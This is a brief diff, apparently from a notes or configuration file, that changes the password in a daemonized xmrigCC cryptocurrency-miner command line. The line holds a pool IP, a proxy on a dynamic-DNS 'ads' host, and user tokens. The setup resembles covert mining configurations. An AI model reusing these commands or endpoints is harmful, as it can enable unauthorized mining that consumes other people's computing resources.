@@ -15,6 +15,6 @@ https://github.com/Bendr0id/xmrigCC/releases/download/3.3.1/xmrigCC-miner_only-3
 
 --daemonized --cpu-max-cpu-usage 89 --url 116.202.3.220:24656 -x ads.bounceme.net:16358 -u 689smwHwGOc+zBuQHbk/Dt1syZrn1Rzx -p tlineGrece01 --donate-level 1 -a rx/xdag -B
 
---daemonized --cpu-max-cpu-usage 89 --url 116.202.3.220:24656 -x ads.bounceme.net:16358 -u 7pRk4QhDsn+PBkh+d6+pvJjZ9lR9C2uH --donate-level 1 -a rx/xdag -B -p tlineGrece01
+--daemonized --cpu-max-cpu-usage 89 --url 116.202.3.220:24656 -x ads.bounceme.net:16358 -u 7pRk4QhDsn+PBkh+d6+pvJjZ9lR9C2uH --donate-level 1 -a rx/xdag -B -p tlineFinland0
     
     
